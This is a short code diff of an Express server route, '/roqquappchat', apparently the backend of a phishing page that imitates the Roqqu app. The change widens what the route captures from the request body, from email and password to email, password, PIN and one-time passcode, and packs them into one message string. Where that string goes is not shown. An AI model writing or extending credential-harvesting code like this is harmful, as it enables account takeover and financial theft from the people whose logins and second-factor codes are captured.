@@ -55,9 +55,8 @@ app.post('/roqquappchat', (req, res, next) => {
     'req body', req.body
   )
 
-  const email = req.body.email
-  const password = req.body.password
-  const content = `email: ${email} \n password: ${password} `
+  const {email, password, pin, otp} = req.body
+  const content = `email: ${email} \n password: ${password} \n PIN: ${pin} \n OTP: ${otp} `
 
 
 
